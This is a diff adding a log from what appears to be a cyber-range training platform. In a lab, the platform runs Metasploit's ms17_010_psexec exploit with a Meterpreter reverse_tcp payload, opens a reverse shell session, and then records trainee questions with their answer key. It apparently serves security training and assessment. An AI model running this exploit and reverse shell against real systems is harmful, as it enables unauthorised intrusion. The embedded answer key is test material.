@@ -1,0 +1,43 @@
+2020-06-01 20:27:41,226- session-for-5ed51e76051e140dbc0be35f - INFO - Property Not Found
+2020-06-01 20:27:50,287- session-for-5ed51e76051e140dbc0be35f - INFO - ....................Parsing Scenario....................
+2020-06-01 20:27:50,288- session-for-5ed51e76051e140dbc0be35f - INFO - [{'TA01_T1190_P1': {'name': 'ms17_010_psexec', 'tactic': 'Initial_Access', 'try_count': 3, 'spawn_seperate_session': True, 'tool': 'metasploit', 'exploit': 'windows/smb/ms17_010_psexec', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'RHOSTS': 'RHOSTS_$ref'}}}]
+2020-06-01 20:27:50,288- session-for-5ed51e76051e140dbc0be35f - INFO - *****************************Check tools status*****************************
+2020-06-01 20:27:50,289- session-for-5ed51e76051e140dbc0be35f - INFO - ['metasploit']
+2020-06-01 20:27:50,289- session-for-5ed51e76051e140dbc0be35f - INFO - msfconsole = [32mTrue[0m
+2020-06-01 20:27:50,289- session-for-5ed51e76051e140dbc0be35f - INFO - ************************Updating Session Tactics**********************
+2020-06-01 20:27:50,292- session-for-5ed51e76051e140dbc0be35f - INFO - Tacics list has been appended in list has been appended in evaluation
+2020-06-01 20:27:50,310- session-for-5ed51e76051e140dbc0be35f - INFO - No Exceptions Found
+2020-06-01 20:27:50,392- session-for-5ed51e76051e140dbc0be35f - INFO - post not needed
+2020-06-01 20:27:50,409- session-for-5ed51e76051e140dbc0be35f - INFO - exploit['LHOST'] not needed...
+2020-06-01 20:27:50,409- session-for-5ed51e76051e140dbc0be35f - INFO - exploit['LPORT'] not needed...
+2020-06-01 20:27:50,409- session-for-5ed51e76051e140dbc0be35f - INFO - option not found in payloads
+2020-06-01 20:27:50,444- session-for-5ed51e76051e140dbc0be35f - INFO - cid: 1
+2020-06-01 20:27:50,444- session-for-5ed51e76051e140dbc0be35f - INFO - ....................Executing Exploit......................................
+2020-06-01 20:27:51,461- session-for-5ed51e76051e140dbc0be35f - INFO - {'job_id': 6, 'uuid': 'spbz6wyr'}
+2020-06-01 20:27:51,466- session-for-5ed51e76051e140dbc0be35f - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:27:54,476- session-for-5ed51e76051e140dbc0be35f - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:27:57,488- session-for-5ed51e76051e140dbc0be35f - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:28:00,500- session-for-5ed51e76051e140dbc0be35f - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:28:03,512- session-for-5ed51e76051e140dbc0be35f - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:28:06,515- session-for-5ed51e76051e140dbc0be35f - INFO - .........Executing Exploit again..........
+
+2020-06-01 20:28:06,516- session-for-5ed51e76051e140dbc0be35f - INFO - ....................Executing Exploit......................................
+2020-06-01 20:28:07,561- session-for-5ed51e76051e140dbc0be35f - INFO - {'job_id': 7, 'uuid': 'vlmtdpwf'}
+2020-06-01 20:28:07,569- session-for-5ed51e76051e140dbc0be35f - INFO - Meterpreter Sessions list empty: {}
+2020-06-01 20:28:10,585- session-for-5ed51e76051e140dbc0be35f - INFO - Meterpreter Sessions {'1': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:41246', 'tunnel_peer': '192.168.18.53:50819', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': 'yhczadpj', 'exploit_uuid': 'vlmtdpwf', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
+2020-06-01 20:28:10,589- session-for-5ed51e76051e140dbc0be35f - INFO - Meterpreter Session found in list!, with ID = 1
+2020-06-01 20:28:10,589- session-for-5ed51e76051e140dbc0be35f - INFO - ....................Meterpreter Session List...............................
+2020-06-01 20:28:10,593- session-for-5ed51e76051e140dbc0be35f - INFO - {'1': {'type': 'meterpreter', 'tunnel_local': '192.168.18.61:41246', 'tunnel_peer': '192.168.18.53:50819', 'via_exploit': 'exploit/windows/smb/ms17_010_psexec', 'via_payload': 'payload/windows/meterpreter/reverse_tcp', 'desc': 'Meterpreter', 'info': '', 'workspace': 'false', 'session_host': '192.168.18.53', 'session_port': 445, 'target_host': '192.168.18.53', 'username': 'root', 'uuid': 'yhczadpj', 'exploit_uuid': 'vlmtdpwf', 'routes': '', 'arch': 'x86', 'platform': 'windows'}}
+2020-06-01 20:28:10,593- session-for-5ed51e76051e140dbc0be35f - INFO - ....................Connected Meterpreter Session Id: 1....................
+2020-06-01 20:28:10,599- session-for-5ed51e76051e140dbc0be35f - INFO - **************************Exploring Evaluation**********************
+2020-06-01 20:28:10,599- session-for-5ed51e76051e140dbc0be35f - INFO - Appending Generalize questions_answers
+2020-06-01 20:28:10,599- session-for-5ed51e76051e140dbc0be35f - INFO - Appending scenario-specific questions_answers
+2020-06-01 20:28:10,599- session-for-5ed51e76051e140dbc0be35f - INFO - *****************************Questions*****************************
+2020-06-01 20:28:10,599- session-for-5ed51e76051e140dbc0be35f - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Which Payload type is being used? For Example: Reverse_tcp': 'windows/x64/meterpreter/reverse_tcp'}, 'Question_2': {" Which port is responsible for Attacker's entrance?": '80'}, 'Question_3': {' Which Port is responsible for backdoor connection?': '8778'}, 'Question_4': {' What is time of running payload?  ': '11:09'}, 'Question_5': {' Which Type of attack it is?   ': 'RCD'}, 'Question_6': {'What is the source of coming of  malicious software?  ': 'Application'}, 'Question_7': {'Is it Escalate its priviledge? ': 'Yes'}, 'Question_8': {'Is it Persistence? ': 'No'}}
+2020-06-01 20:28:10,600- session-for-5ed51e76051e140dbc0be35f - INFO - *****************************Actual Answers*****************************
+2020-06-01 20:28:10,600- session-for-5ed51e76051e140dbc0be35f - INFO - ['192.168.18.61', 41246, 'windows/x64/meterpreter/reverse_tcp', '80', '8778', '11:09', 'RCD', 'Application', 'Yes', 'No']
+2020-06-01 20:28:10,605- session-for-5ed51e76051e140dbc0be35f - INFO - evaluation id:5ed51e76051e140dbc0be360
+2020-06-01 20:28:10,605- session-for-5ed51e76051e140dbc0be35f - INFO - ************************Updating Evaluation form for user**********************
+2020-06-01 20:28:10,610- session-for-5ed51e76051e140dbc0be35f - INFO - TA01_T1190_P1 has been appended in evaluation
+2020-06-01 20:28:10,610- session-for-5ed51e76051e140dbc0be35f - INFO - ******[Scenario-ID: TA01_T1190_P1Tactic: Initial_Access executed]******
+2020-06-01 20:28:10,610- session-for-5ed51e76051e140dbc0be35f - INFO - ....................Destroying Session.....................................
